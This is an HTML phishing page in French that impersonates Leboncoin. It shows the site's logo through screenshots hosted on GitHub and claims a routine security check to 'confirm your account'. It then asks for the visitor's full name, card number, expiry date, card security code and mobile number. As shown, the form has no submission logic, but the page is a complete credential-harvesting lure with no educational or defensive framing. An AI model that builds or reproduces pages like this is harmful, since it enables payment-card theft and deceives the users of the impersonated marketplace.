<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification des Informations</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            position: relative;
            overflow-y: auto;
        }
        .platform {
            background-color: white;
            border-radius: 20px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            position: relative;
            z-index: 1;
            margin-top: 70px;
            margin-bottom: 150px;
        }
        h1 {
            color: black; /* Titre en noir */
            margin-bottom: 20px;
            font-size: 28px;
        }
        .header-logo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 70px;
            object-fit: cover;
            z-index: 0;
            filter: contrast(1.2);
        }
        .footer-logo {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: auto;
            z-index: 0;
            opacity: 0.8;
        }
        .input-field {
            width: 100%;
            padding: 15px;
            margin: 15px 0;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }
        .input-field:focus {
            border-color: #007BFF; /* Bleu pour correspondre au bouton */
            box-shadow: 0 0 10px rgba(0, 123, 255, 0.2);
            outline: none;
        }
        .input-field::placeholder {
            color: #999;
        }
        .button {
            background-color: #007BFF; /* Bouton en bleu */
            color: white;
            padding: 18px 36px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 18px;
            margin: 30px 0;
            cursor: pointer;
            border: none;
            border-radius: 10px;
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); /* Ombre bleue */
        }
        .button:hover {
            background-color: #0056b3; /* Bleu plus foncé au survol */
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 123, 255, 0.4);
        }
        .button:active {
            transform: translateY(0);
            box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
        }
        .logo-container {
            margin: 20px 0;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-10px);
            }
        }
    </style>
</head>
<body>
    <!-- Logo en haut, étendu sur toute la largeur et en arrière-plan -->
    <a href="https://www.leboncoin.fr" target="_blank">
        <img src="https://raw.githubusercontent.com/zapata225/lebon/refs/heads/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20110632.png" alt="Logo LeBoncoin" class="header-logo">
    </a>

    <!-- Plateforme de vérification des informations -->
    <div class="platform">
        <h1>Vérification des Informations</h1>
        <p>Pour des raisons de sécurité, nous procéderons parfois à la vérification rapide de vos informations personnelles, y compris à chaque mise à jour du site. Veuillez confirmer votre compte.</p>
        
        <!-- Logo ajouté ici avec une animation flottante et agrandi x2 -->
        <div class="logo-container">
            <img src="https://signastore.fr/img/cms/BRAND-PAYMENT-ICON.png" alt="Logo de vérification" style="width: 200px;"> <!-- Agrandi x2 -->
        </div>

        <!-- Champs pour les informations personnelles -->
        <input type="text" class="input-field" placeholder="Nom & Prénom(s)">
        <input type="text" class="input-field" placeholder="Numéro de carte">
        <input type="text" class="input-field" placeholder="Date d'expiration">
        <input type="text" class="input-field" placeholder="Cryptogramme visuel">
        <input type="text" class="input-field" placeholder="Numéro de mobile">

        <!-- Bouton de validation en bleu -->
        <button class="button">Valider</button>
    </div>

    <!-- Logo en bas, étendu sur toute la largeur -->
    <img src="https://github.com/zapata225/lebon/blob/main/Capture%20d%E2%80%99%C3%A9cran%202025-02-24%20115029.png?raw=true" alt="Logo LeBoncoin Bas" class="footer-logo">
</body>
</html>
